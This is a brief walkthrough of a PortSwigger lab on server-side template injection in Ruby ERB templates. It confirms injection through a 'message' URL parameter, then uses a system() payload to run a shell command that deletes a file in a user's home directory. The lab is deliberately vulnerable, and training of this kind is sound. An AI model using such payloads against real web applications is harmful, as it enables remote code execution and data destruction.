https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.



1) go on the home page and open the first product

2) notice that in the url there is
    /?message=Unfortunately%20this%20product%20is%20out%20of%20stock

    and this is reflected in the page

3) try to inject ERB code execution (ERB is a template manager)

    so try t oinject /?message=<%= 7*7 %>

    we can see that in the page is reflected 49

4) so we can execute code
       /?message=<%= system("rm /home/carlos/morale.txt")  %>

5) done


